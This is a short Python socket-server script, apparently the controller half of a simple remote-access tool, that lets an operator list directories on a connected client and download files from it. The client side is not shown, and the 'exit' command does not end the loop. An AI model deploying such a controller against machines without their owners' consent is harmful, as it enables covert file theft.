import os 
import socket 

s = socket.socket()
host = socket.gethostname()
port = 8082
s.bind((host,port))
print("")
print("[+] server is currently running 0 ", host)
print('[+] waiting  for incoming connections.... ')
s.listen(1)
conn, addr = s.accept()

print('')
print(addr,'Has connected to the server successfully ')
print('')
print('----------------Help  command ---------------\n')
print('[+] view_cwd', '[+] custom_dir', '[+] download_file [+] exit \n')
exit = 1 
try:
    while(exit):
       command = input(str('command >> '))
       if command == 'view_cwd':
           conn.send(command.encode())
           print('')
           print('command send waiting for excution....')
           print('')
           
           
           files = conn.recv(5000)
           files = files.decode()
           print('command output : ', files)
           print('')
       elif(command == 'custom_dir'):
           conn.send(command.encode())
           print('')
           user_input = input(str('custom dir : '))
           conn.send(user_input.encode())
           print('')
           print('command has been send ')
           print('')
           files = conn.recv(5000)
           files = files.decode()
           print('custom dir result : ', files)
           print('')
           
       elif command == 'download_file':
            conn.send(command.encode())
            filepath = input('please enter file path including filename : ')
            conn.send(filepath.encode())
            file = conn.recv(100000)
            filename  = input('please enter a filename for the including the extension : ')
            new_file = open(filename, 'wb')
            new_file.write(file)
            new_file.close()
            
            print(filename,' has been downloaded and saved\n')  
       elif(command == 'exit'): 
           conn.send(command.encode())
           
           print('')
           print(addr,'Has disconnected to the server successfully ')
             
       else:

           print('command not recognised\n')    
           
except:
      print("client isn't ready to connection so server has been closed")    
      conn.close()             
   
   
   
   
   
